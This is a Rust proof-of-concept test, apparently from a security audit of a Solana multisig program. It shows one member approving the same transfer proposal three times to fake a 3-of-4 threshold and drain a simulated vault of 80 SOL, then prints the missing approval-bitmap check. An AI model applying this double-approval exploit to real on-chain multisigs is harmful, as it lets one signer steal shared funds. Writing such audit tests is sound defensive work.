// Exploit: Double Approval Attack (Missing Bitmap Check)
//
// Vulnerability: V005 - The approve_transfer_proposal instruction does not check
// if a member has already approved before incrementing approval_count.
//
// Attack: Single member approves the same proposal multiple times, artificially
// inflating the approval count to meet threshold without genuine consensus.
//
// Result: Single member can approve their own malicious proposal enough times
// to execute it, completely bypassing multi-signature security.

mod utils;

use utils::*;

use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};

#[test]
fn test_exploit_double_approval() {
    println!("\n=== EXPLOIT TEST: Double Approval (V005) ===\n");
    println!("[Scenario] Attacker approves same proposal multiple times");

    let mut scenario = setup_multisig_scenario(3, 0); // threshold = 3, timelock = 0

    println!("[Setup] Creating multisig with threshold = 3...");

    // Create multisig with 4 members, threshold = 3
    let owners = vec![
        (scenario.creator.pubkey(), MemberRole::Admin),
        (scenario.member1.pubkey(), MemberRole::Proposer),
        (scenario.member2.pubkey(), MemberRole::Executor),
        (scenario.member3.pubkey(), MemberRole::Executor),
    ];

    create_multisig_with_owners(
        &mut scenario.svm,
        &scenario.creator,
        &scenario.multisig_pda,
        &scenario.vault_pda,
        scenario.multisig_id,
        3, // threshold
        0, // timelock
        &owners,
    );

    println!("[Setup] Multisig created with 4 members, threshold = 3");

    // Fund the vault
    println!("[Setup] Funding vault with 80 SOL...");
    fund_vault(
        &mut scenario.svm,
        &scenario.vault_pda,
        80 * LAMPORTS_PER_SOL,
    );

    let vault_balance = scenario.svm.get_account(&scenario.vault_pda)
        .expect("Vault should exist")
        .lamports;
    println!("[Setup] Vault balance: {} SOL", vault_balance / LAMPORTS_PER_SOL);

    // Attacker (member1) creates malicious transfer proposal
    println!("\n[Attack] Member1 creates transfer proposal to steal 80 SOL...");

    // Get current proposal_count to derive correct PDA
    let proposal_count = get_multisig_proposal_count(&scenario.svm, &scenario.multisig_pda);
    let (transfer_proposal_pda, _) =
        derive_transfer_proposal_pda(&scenario.multisig_pda, proposal_count);

    let create_transfer_ix = build_create_transfer_proposal_ix(
        &scenario.member1.pubkey(),
        &scenario.multisig_pda,
        &transfer_proposal_pda,
        80 * LAMPORTS_PER_SOL,
        &scenario.attacker.pubkey(),
    );

    send_tx_expect_success(
        &mut scenario.svm,
        create_transfer_ix,
        &scenario.member1,
        &[&scenario.member1],
    );

    println!("[Attack] Proposal created (auto-approved by member1)");
    println!("[Attack] Current approvals: 1/3");

    // EXPLOIT: Member1 approves the SAME proposal again (second approval)
    println!("\n[Attack] Member1 approves their OWN proposal AGAIN (2nd time)...");

    let approve_ix_data = build_approve_transfer_proposal_data();

    let approve_ix_1 = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.member1.pubkey(), true), // same member!
            AccountMeta::new(scenario.multisig_pda, false),
            AccountMeta::new(transfer_proposal_pda, false),
        ],
        data: approve_ix_data.clone(),
    };

    let approve_tx_1 = Transaction::new_signed_with_payer(
        &[approve_ix_1],
        Some(&scenario.member1.pubkey()),
        &[&scenario.member1],
        scenario.svm.latest_blockhash(),
    );

    let result_1 = scenario.svm.send_transaction(approve_tx_1);

    match result_1 {
        Ok(metadata) => {
            println!("[VULNERABLE] Second approval by SAME member succeeded!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);
            println!("[Attack] Current approvals: 2/3 (INFLATED!)");
        }
        Err(e) => {
            println!("[Result] Second approval failed: {:?}", e);
            println!("[Analysis] This should fail with 'AlreadyApproved' error");

            let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }

            
            return;
        }
    }

    // EXPLOIT: Member1 approves the SAME proposal AGAIN (third approval)
    println!("\n[Attack] Member1 approves AGAIN (3rd time)...");

    let approve_ix_2 = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.member1.pubkey(), true), // SAME member, 3rd time!
            AccountMeta::new(scenario.multisig_pda, false),
            AccountMeta::new(transfer_proposal_pda, false),
        ],
        data: approve_ix_data,
    };

    let approve_tx_2 = Transaction::new_signed_with_payer(
        &[approve_ix_2],
        Some(&scenario.member1.pubkey()),
        &[&scenario.member1],
        scenario.svm.latest_blockhash(),
    );

    let result_2 = scenario.svm.send_transaction(approve_tx_2);

    match result_2 {
        Ok(metadata) => {
            println!("[VULNERABLE] Third approval by SAME member succeeded!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);
            println!("[EXPLOIT SUCCESS] Current approvals: 3/3 (ALL FROM ONE MEMBER!)");
        }
        Err(e) => {
            println!("[Result] Third approval failed: {:?}", e);
           let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }
            return;
        }
    }

    // Now execute the proposal with artificially inflated approval count
    println!("\n[Attack] Executing proposal with inflated approval count...");

    let attacker_balance_before = scenario.svm.get_account(&scenario.attacker.pubkey())
        .expect("Attacker account should exist")
        .lamports;

    let execute_ix_data = build_execute_transfer_proposal_data();

    let execute_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.member2.pubkey(), true), // executor
            AccountMeta::new(scenario.multisig_pda, false),
            AccountMeta::new(transfer_proposal_pda, false),
            AccountMeta::new(scenario.member1.pubkey(), false), // proposer
            AccountMeta::new(scenario.vault_pda, false),
            AccountMeta::new(scenario.attacker.pubkey(), false),
            AccountMeta::new_readonly(solana_system_interface::program::ID, false),
        ],
        data: execute_ix_data,
    };

    let execute_tx = Transaction::new_signed_with_payer(
        &[execute_ix],
        Some(&scenario.member2.pubkey()),
        &[&scenario.member2],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(execute_tx);

    match result {
        Ok(metadata) => {
            println!("[VULNERABLE] Execution succeeded!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);

            let attacker_balance_after = scenario.svm.get_account(&scenario.attacker.pubkey())
                .expect("Attacker account should exist")
                .lamports;

            println!("[EXPLOIT SUCCESS] Attacker balance increased by: {} SOL",
                (attacker_balance_after - attacker_balance_before) / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Only 1 unique member approved (not 3!)");

            println!("\n[Analysis] The vulnerable code is missing this check:");
            println!("           let bit_mask = 1u64 << member_index;");
            println!("           require!(");
            println!("               self.approval_bitmap & bit_mask == 0,");
            println!("               MultisigError::AlreadyApproved");
            println!("           );");
        }
        Err(e) => {
            println!("[Result] Execution failed: {:?}", e);
            println!("[Analysis] Execution might have failed due to other checks");

            let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }
        }
    }

    println!("\n=== END: Double Approval Exploit ===\n");
}
